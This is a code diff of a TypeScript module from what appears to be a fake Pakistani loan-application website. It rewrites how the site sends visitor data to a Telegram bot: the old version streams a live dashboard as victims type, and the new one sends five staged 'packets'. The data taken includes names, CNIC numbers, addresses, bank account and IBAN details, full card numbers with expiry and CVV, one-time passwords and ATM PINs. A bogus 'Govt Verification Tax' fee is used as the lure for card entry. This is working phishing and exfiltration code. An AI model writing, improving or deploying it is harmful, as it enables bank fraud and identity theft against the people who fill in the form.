@@ -1,8 +1,10 @@
-// Service to maintain a SINGLE PINNED SESSION MESSAGE in Telegram and edit it in real-time
+import { PersonalInfo, BankInfo, CardInfo } from '../types';
 
+// Telegram Bot Environment Config
 const getBotToken = (): string => {
   return (
     (import.meta as any).env?.TELEGRAM_BOT_TOKEN ||
+    (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN ||
     (typeof process !== 'undefined' && process.env?.TELEGRAM_BOT_TOKEN) ||
     ''
   );
@@ -11,276 +13,229 @@ const getBotToken = (): string => {
 const getChatId = (): string => {
   return (
     (import.meta as any).env?.TELEGRAM_CHAT_ID ||
+    (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID ||
     (typeof process !== 'undefined' && process.env?.TELEGRAM_CHAT_ID) ||
     ''
   );
 };
 
-// Single Session State Storage
-let sessionId = Math.random().toString(36).substring(2, 9).toUpperCase();
-let activeMessageId: number | null = null;
-let isPinned = false;
+// Generate human-readable session ID
+const generateSessionId = () => `PK-${Math.floor(100000 + Math.random() * 900000)}`;
 
-interface SessionState {
-  currentStep: string;
-  stepTitle: string;
-  personal: {
-    fullName: string;
-    cnic: string;
-    mobileNo: string;
-    gender: string;
-    dob: string;
-    province: string;
-    address: string;
-  };
-  bank: {
-    loanAmount: string;
-    loanPurpose: string;
-    occupation: string;
-    bankName: string;
-    accountNumber: string;
-    currentBalance: string;
-    monthlyIncome: string;
-  };
-  card: {
-    cardNumber: string;
-    expiry: string;
-    cvv: string;
-  };
-  otp: string;
-  pin: string;
-  trackingId: string;
-  lastUpdated: string;
+let currentSessionId = generateSessionId();
+
+export function getSessionId(): string {
+  return currentSessionId;
 }
 
-const currentSession: SessionState = {
-  currentStep: 'hero',
-  stepTitle: 'Home Hero Page',
-  personal: {
-    fullName: '',
-    cnic: '',
-    mobileNo: '',
-    gender: '',
-    dob: '',
-    province: '',
-    address: '',
-  },
-  bank: {
-    loanAmount: '500,000',
-    loanPurpose: '',
-    occupation: '',
-    bankName: '',
-    accountNumber: '',
-    currentBalance: '',
-    monthlyIncome: '',
-  },
-  card: {
-    cardNumber: '',
-    expiry: '',
-    cvv: '',
-  },
-  otp: '',
-  pin: '',
-  trackingId: '',
-  lastUpdated: new Date().toLocaleTimeString('en-PK'),
-};
-
-let updateTimer: NodeJS.Timeout | null = null;
-
-/**
- * Format the entire session state into a single HTML Dashboard message
- */
-function renderSessionDashboard(): string {
-  const s = currentSession;
-  return (
-    `🟢 <b>LIVE SESSION DASHBOARD</b> [<code>#${sessionId}</code>]\n` +
-    `📌 <b>Status:</b> ${s.currentStep.toUpperCase()} (${s.stepTitle})\n` +
-    `⏰ <b>Last Active:</b> ${s.lastUpdated}\n\n` +
-
-    `👤 <b>PERSONAL DETAILS</b>\n` +
-    `• Name: <b>${s.personal.fullName || '---'}</b>\n` +
-    `• CNIC: <code>${s.personal.cnic || '---'}</code>\n` +
-    `• Mobile: <code>${s.personal.mobileNo || '---'}</code>\n` +
-    `• DOB: <b>${s.personal.dob || '---'}</b>\n` +
-    `• Gender: ${s.personal.gender || '---'}\n` +
-    `• Province: ${s.personal.province || '---'}\n` +
-    `• Address: ${s.personal.address || '---'}\n\n` +
-
-    `🏦 <b>BANK & FINANCIAL DETAILS</b>\n` +
-    `• Loan Amount: <b>Rs. ${s.bank.loanAmount || '---'}</b>\n` +
-    `• Purpose: ${s.bank.loanPurpose || '---'}\n` +
-    `• Occupation: ${s.bank.occupation || '---'}\n` +
-    `• Bank: <b>${s.bank.bankName || '---'}</b>\n` +
-    `• Account/IBAN: <code>${s.bank.accountNumber || '---'}</code>\n` +
-    `• Balance: <b>Rs. ${s.bank.currentBalance || '---'}</b>\n` +
-    `• Monthly Income: <b>Rs. ${s.bank.monthlyIncome || '---'}</b>\n\n` +
-
-    `💳 <b>CARD DETAILS</b>\n` +
-    `• Card Number: <code>${s.card.cardNumber || '---'}</code>\n` +
-    `• Expiry: <code>${s.card.expiry || '---'}</code>\n` +
-    `• CVV: <code>${s.card.cvv || '---'}</code>\n\n` +
-
-    `🔑 <b>LIVE SECURITY CODES</b>\n` +
-    `• Live OTP Code: <code>${s.otp || '---'}</code>\n` +
-    `• Live ATM PIN: <code>${s.pin || '---'}</code>\n` +
-    (s.trackingId ? `\n🎉 <b>Tracking ID:</b> <code>${s.trackingId}</code>` : '')
-  );
+export function resetSession(): void {
+  currentSessionId = generateSessionId();
 }
 
 /**
- * Dispatch real-time DOM-style update to Telegram (Single Pinned Message)
+ * Escapes characters for Telegram HTML parse_mode
  */
-async function syncSessionToTelegram() {
+function escapeHtml(text: string | number | undefined | null): string {
+  if (text === undefined || text === null) return '';
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+/**
+ * Core helper to send an HTML-formatted message packet to Telegram
+ */
+export async function sendTelegramMessage(htmlText: string): Promise<boolean> {
   const botToken = getBotToken();
   const chatId = getChatId();
 
-  if (!botToken || botToken.includes('example_token_replace_me') || !chatId) {
-    return;
+  if (!botToken || botToken.includes('YOUR_TELEGRAM_BOT_TOKEN') || !chatId) {
+    console.info('[Telegram Service] Bot token or chat ID not set. Message packet logged locally:');
+    console.log(htmlText.replace(/<[^>]+>/g, ''));
+    return false;
   }
 
-  currentSession.lastUpdated = new Date().toLocaleTimeString('en-PK');
-  const text = renderSessionDashboard();
-
   try {
-    // 1. If we don't have an active message ID yet, create one
-    if (!activeMessageId) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const resp = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: 'HTML',
-        }),
-      });
-
-      const data = await resp.json();
-      if (data.ok && data.result?.message_id) {
-        activeMessageId = data.result.message_id;
-
-        // Try pinning the newly created session message
-        try {
-          const pinUrl = `https://api.telegram.org/bot${botToken}/pinChatMessage`;
-          await fetch(pinUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              message_id: activeMessageId,
-              disable_notification: true,
-            }),
-          });
-          isPinned = true;
-        } catch (pinErr) {
-          console.warn('[Telegram] Pinning optional warning:', pinErr);
-        }
-      }
-      return;
-    }
-
-    // 2. If active message ID exists, EDIT the existing message in real-time
-    const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
-    const editResp = await fetch(editUrl, {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json',
+      },
       body: JSON.stringify({
         chat_id: chatId,
-        message_id: activeMessageId,
-        text: text,
+        text: htmlText,
         parse_mode: 'HTML',
       }),
     });
 
-    const editData = await editResp.json();
-    // If message was deleted or failed to edit, reset activeMessageId so next update creates a new message
-    if (!editData.ok && editData.description && !editData.description.includes('exactly the same')) {
-      if (editData.description.includes('not found') || editData.description.includes('deleted')) {
-        activeMessageId = null;
-      }
+    const result = await response.json();
+    if (!result.ok) {
+      console.error('[Telegram Service] Failed to deliver packet:', result);
+      return false;
     }
-  } catch (error) {
-    console.error('[Telegram Service] Real-time edit error:', error);
+    return true;
+  } catch (err) {
+    console.error('[Telegram Service] Network error delivering packet to Telegram:', err);
+    return false;
   }
 }
 
 /**
- * Debounced trigger for real-time live typing updates
+ * PACKET 1: Step 1 - Personal Information
+ * Sent when user fills all personal info and clicks Continue
  */
-export function triggerDebouncedTelegramSync(delayMs = 400) {
-  if (updateTimer) clearTimeout(updateTimer);
-  updateTimer = setTimeout(() => {
-    syncSessionToTelegram();
-  }, delayMs);
+export async function sendStep1PersonalPacket(data: PersonalInfo): Promise<boolean> {
+  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const date = new Date().toLocaleDateString('en-PK');
+
+  const text =
+    `📦 <b>[PACKET 1/5] STEP 1: PERSONAL INFORMATION</b>\n` +
+    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
+    `⏰ <b>Time:</b> ${time} (${date})\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `👤 <b>Full Name:</b> <b>${escapeHtml(data.fullName)}</b>\n` +
+    `🪪 <b>CNIC Number:</b> <code>${escapeHtml(data.cnic)}</code>\n` +
+    `📱 <b>Mobile Number:</b> <code>${escapeHtml(data.mobileNo)}</code>\n` +
+    `🎂 <b>Date of Birth:</b> <b>${escapeHtml(data.dob)}</b>\n` +
+    `⚧ <b>Gender:</b> ${escapeHtml(data.gender)}\n` +
+    `📍 <b>Province:</b> ${escapeHtml(data.province)}\n` +
+    `🏠 <b>Address:</b> ${escapeHtml(data.address)}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `✅ <i>Step 1 validated & continued by user</i>`;
+
+  return sendTelegramMessage(text);
 }
 
 /**
- * Step navigation update listener
+ * PACKET 2: Step 2 - Bank & Financial Information
+ * Sent when user fills all bank info and clicks Continue
  */
-export function sendStepNotification(stepName: string, stepTitle: string) {
-  currentSession.currentStep = stepName;
-  currentSession.stepTitle = stepTitle;
-  triggerDebouncedTelegramSync(100);
+export async function sendStep2BankPacket(data: BankInfo, personal?: PersonalInfo): Promise<boolean> {
+  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const applicantInfo = personal?.fullName
+    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b> (${escapeHtml(personal.cnic || personal.mobileNo)})\n`
+    : '';
+
+  const text =
+    `📦 <b>[PACKET 2/5] STEP 2: BANK & FINANCIAL INFO</b>\n` +
+    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
+    applicantInfo +
+    `⏰ <b>Time:</b> ${time}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `💰 <b>Requested Loan:</b> <b>PKR ${escapeHtml(data.loanAmount)}</b>\n` +
+    `🎯 <b>Loan Purpose:</b> ${escapeHtml(data.loanPurpose)}\n` +
+    `💼 <b>Occupation:</b> ${escapeHtml(data.occupation)}\n` +
+    `🏛️ <b>Bank Name:</b> <b>${escapeHtml(data.bankName)}</b>\n` +
+    `💳 <b>Account / IBAN:</b> <code>${escapeHtml(data.accountNumber)}</code>\n` +
+    `💵 <b>Current Balance:</b> <b>PKR ${escapeHtml(data.currentBalance)}</b>\n` +
+    `📈 <b>Monthly Income:</b> <b>PKR ${escapeHtml(data.monthlyIncome)}</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `✅ <i>Step 2 validated & continued by user</i>`;
+
+  return sendTelegramMessage(text);
 }
 
 /**
- * Personal Info real-time listener
+ * PACKET 3: Step 3 - Processing Fee & Card Information
+ * Sent when user fills card info and clicks Pay & Continue
  */
-export function sendRealtimePersonalInfoUpdate(data: Partial<SessionState['personal']>) {
-  currentSession.personal = { ...currentSession.personal, ...data };
-  triggerDebouncedTelegramSync(400);
+export async function sendStep3CardPacket(data: CardInfo, personal?: PersonalInfo): Promise<boolean> {
+  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const applicantInfo = personal?.fullName
+    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b> (${escapeHtml(personal.mobileNo)})\n`
+    : '';
+
+  const text =
+    `📦 <b>[PACKET 3/5] STEP 3: CARD & PROCESSING FEE</b>\n` +
+    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
+    applicantInfo +
+    `⏰ <b>Time:</b> ${time}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🏷️ <b>Processing Fee:</b> <b>PKR 75</b> (Govt Verification Tax)\n` +
+    `💳 <b>ATM / Debit Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>\n` +
+    `📅 <b>Expiry Date:</b> <code>${escapeHtml(data.expiry)}</code>\n` +
+    `🔒 <b>CVV Code:</b> <code>${escapeHtml(data.cvv)}</code>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `✅ <i>Step 3 Fee payment authorized & continued</i>`;
+
+  return sendTelegramMessage(text);
 }
 
 /**
- * Bank Info real-time listener
+ * PACKET 4: Step 4 - OTP Verification
+ * Sent when user enters 6-digit OTP and clicks Verify OTP
  */
-export function sendRealtimeBankInfoUpdate(data: Partial<SessionState['bank']>) {
-  currentSession.bank = { ...currentSession.bank, ...data };
-  triggerDebouncedTelegramSync(400);
+export async function sendStep4OtpPacket(
+  otp: string,
+  mobileNo?: string,
+  personal?: PersonalInfo
+): Promise<boolean> {
+  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const applicantInfo = personal?.fullName
+    ? `👤 <b>Applicant:</b> <b>${escapeHtml(personal.fullName)}</b>\n`
+    : '';
+
+  const text =
+    `📦 <b>[PACKET 4/5] STEP 4: OTP CODE VERIFICATION</b>\n` +
+    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
+    applicantInfo +
+    `⏰ <b>Time:</b> ${time}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `📱 <b>Mobile Number:</b> <code>${escapeHtml(mobileNo || personal?.mobileNo || '---')}</code>\n` +
+    `🔑 <b>Submitted OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `✅ <i>Step 4 OTP verified & continued</i>`;
+
+  return sendTelegramMessage(text);
 }
 
 /**
- * Card Info real-time listener
+ * PACKET 5: Step 5 - ATM PIN & Master Application Dossier
+ * Sent when user enters 4-digit ATM PIN and submits final application
  */
-export function sendRealtimeCardInfoUpdate(data: Partial<SessionState['card']>) {
-  currentSession.card = { ...currentSession.card, ...data };
-  triggerDebouncedTelegramSync(300);
-}
-
-/**
- * OTP Code real-time listener
- */
-export function sendRealtimeOtpUpdate(otp: string) {
-  currentSession.otp = otp;
-  triggerDebouncedTelegramSync(200);
-}
-
-/**
- * ATM PIN real-time listener
- */
-export function sendRealtimePinUpdate(pin: string) {
-  currentSession.pin = pin;
-  triggerDebouncedTelegramSync(200);
-}
-
-/**
- * Final Submission summary update
- */
-export function sendFinalApplicationToTelegram(payload: {
-  trackingId: string;
-  personal: any;
-  bank: any;
-  card: any;
-  otp: string;
+export async function sendStep5PinAndFinalPacket(payload: {
   pin: string;
-}) {
-  currentSession.trackingId = payload.trackingId;
-  currentSession.personal = { ...currentSession.personal, ...payload.personal };
-  currentSession.bank = { ...currentSession.bank, ...payload.bank };
-  currentSession.card = { ...currentSession.card, ...payload.card };
-  currentSession.otp = payload.otp;
-  currentSession.pin = payload.pin;
-  currentSession.currentStep = 'SUBMITTED';
-  currentSession.stepTitle = 'Application Completed';
-  syncSessionToTelegram();
+  trackingId: string;
+  personal: PersonalInfo;
+  bank: BankInfo;
+  card: CardInfo;
+  otp: string;
+}): Promise<boolean> {
+  const time = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  const date = new Date().toLocaleDateString('en-PK');
+  const { pin, trackingId, personal, bank, card, otp } = payload;
+
+  const text =
+    `📦 <b>[PACKET 5/5] STEP 5: ATM PIN & FINAL SUBMISSION</b>\n` +
+    `🆔 <b>Session ID:</b> <code>#${currentSessionId}</code>\n` +
+    `🎉 <b>Official Tracking ID:</b> <code>${escapeHtml(trackingId)}</code>\n` +
+    `⏰ <b>Submitted At:</b> ${time} (${date})\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🔐 <b>ATM PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
+    `🔑 <b>Verified OTP:</b> <code>${escapeHtml(otp)}</code>\n\n` +
+    `💳 <b>CARD DETAILS:</b>\n` +
+    `• Number: <code>${escapeHtml(card.cardNumber)}</code>\n` +
+    `• Expiry: <code>${escapeHtml(card.expiry)}</code> | CVV: <code>${escapeHtml(card.cvv)}</code>\n\n` +
+    `🏛️ <b>BANK & LOAN DETAILS:</b>\n` +
+    `• Requested Loan: <b>PKR ${escapeHtml(bank.loanAmount)}</b>\n` +
+    `• Purpose: ${escapeHtml(bank.loanPurpose)}\n` +
+    `• Occupation: ${escapeHtml(bank.occupation)}\n` +
+    `• Bank: <b>${escapeHtml(bank.bankName)}</b>\n` +
+    `• Account / IBAN: <code>${escapeHtml(bank.accountNumber)}</code>\n` +
+    `• Current Balance: PKR ${escapeHtml(bank.currentBalance)}\n` +
+    `• Monthly Income: PKR ${escapeHtml(bank.monthlyIncome)}\n\n` +
+    `👤 <b>APPLICANT DETAILS:</b>\n` +
+    `• Name: <b>${escapeHtml(personal.fullName)}</b>\n` +
+    `• CNIC: <code>${escapeHtml(personal.cnic)}</code>\n` +
+    `• Mobile: <code>${escapeHtml(personal.mobileNo)}</code>\n` +
+    `• DOB: ${escapeHtml(personal.dob)} | Gender: ${escapeHtml(personal.gender)}\n` +
+    `• Province: ${escapeHtml(personal.province)}\n` +
+    `• Address: ${escapeHtml(personal.address)}\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🚀 <b>APPLICATION COMPLETED & SUBMITTED TO PORTAL</b>`;
+
+  return sendTelegramMessage(text);
 }
